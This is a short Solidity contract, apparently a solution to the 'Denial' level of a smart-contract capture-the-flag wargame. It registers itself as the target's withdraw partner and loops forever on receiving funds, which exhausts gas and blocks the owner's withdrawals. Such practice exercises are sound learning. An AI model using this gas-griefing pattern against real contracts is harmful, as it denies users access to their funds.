// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../LevelsContracts/#20 Denial.sol";

contract DenialHack {
    Denial level20 = Denial("address");

    constructor() {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}